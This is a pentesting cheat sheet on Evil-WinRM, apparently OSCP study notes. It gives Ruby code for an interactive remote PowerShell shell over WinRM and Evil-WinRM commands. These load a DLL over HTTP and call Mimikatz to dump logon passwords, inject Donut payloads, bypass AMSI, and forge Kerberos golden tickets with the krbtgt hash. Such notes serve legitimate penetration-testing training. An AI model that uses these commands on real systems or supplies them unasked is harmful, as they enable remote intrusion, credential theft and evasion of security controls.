# know how evilwinrm
```bash
## know how port 5985
## know how port 5986
## know how evilwinrm
## know how winrm
## know how evilwirm cheat sheet
## know how oscp
```
"This shell is the ultimate WinRM shell for hacking/pentesting.

WinRM (Windows Remote Management) is the Microsoft implementation of WS-Management Protocol. A standard SOAP based protocol
that allows hardware and operating systems from different vendors to interoperate. Microsoft included it in their Operating
Systems in order to make life easier to system administrators.

This program can be used on any Microsoft Windows Servers with this feature enabled (usually at port 5985), of course only
if you have credentials and permissions to use it. So we can say that it could be used in a post-exploitation hacking/pentesting
phase. The purpose of this program is to provide nice and easy-to-use features for hacking. It can be used with legitimate
purposes by system administrators as well but the most of its features are focused on hacking/pentesting stuff.

It is based mainly in the WinRM Ruby library which changed its way to work since its version 2.0. Now instead of using WinRM
protocol, it is using PSRP (Powershell Remoting Protocol) for initializing runspace pools as well as creating and processing pipelines.
"

```bash
# You can use WinRM to execute remote commands and even get a shell
# Port 5985 needs to be opended
# Default endpoint is /wsman
require 'winrm'

conn = WinRM::Connection.new( 
  endpoint: 'http://ip:5985/wsman',
  user: 'domain/user',
  password: 'password',
)

command=""

conn.shell(:powershell) do |shell|
    until command == "exit\n" do
        print "PS > "
        command = gets        
        output = shell.run(command) do |stdout, stderr|
            STDOUT.print stdout
            STDERR.print stderr
        end
    end    
    puts "Exiting with code #{output.exitcode}"
end

```

```bash
# Evil-WinRM is another complete tool for WinRIM
https://github.com/Hackplayers/evil-winrm

# Simple usage
ruby evil-winrm.rb -i 10.10.10.172 -u user -p password

# Upload and Download
> upload local_filename (destination_filename)
> download remote_filename (destination_filename)

# List all services showing if there your account has permissions over each one
> services

# Menu listing loaded modules (default presented below)
> menu 
```

```bash
# You can load local PS1 scripts just by typing script name
# The scripts must be in the path set at -s argument
> Powerview.ps1
> menu
```
```bash
# Using advanced commands

# Invoke-Binary
# Allows exes compiled from c# to be executed in memory
# The executables must be in the path set at -e argument
> Invoke-Binary /opt/csharp/Binary.exe 'param1, param2, param3'

# DLL Loader
# allows loading dll libraries in memory. The dll file can be hosted by smb, http or locally.
# You can then use auto-completion
> Dll-Loader -http -path http://xx.xx.xx.xx/sharpsploit.dll
> [Sharpsploit.Credentials.Mimikatz]::LogonPasswords()

# Donut Loader
# allows to inject x64 payloads generated with awesome donut technique
# No need to encode the payload.bin, just generate and inject
https://github.com/Hackplayers/Salsa-tools/blob/master/Donut-Maker/donut-maker.py
python3 donut-maker.py covenant.exe

# Bypass-4MSI
# patchs AMSI protection
> amsiscanbuffer
> Bypass-4MSI
> amsiscanbuffer
```

```bash
# Using Kerberos

# First, date synchro
rdate -n <dc-ip>

# Ticket generation (ticketer, kirbi rubeus or mimikatz...)
ticketer.py -dc-ip <dc_ip> -nthash <krbtgt_nthash> -domain-sid <domain_sid> -domain <domain_name> <user>
python ticket_converter.py ticket.kirbi ticket.ccache

# Add ccache ticket (2 ways)
export KRB5CCNAME=/foo/var/ticket.ccache
cp ticket.ccache /tmp/krb5cc_0

# Add realm to /etc/krb5.conf (for linux). Use of this format is important
CONTOSO.COM = {
             kdc = fooserver.contoso.com
 }

# Check ticket
klist
```
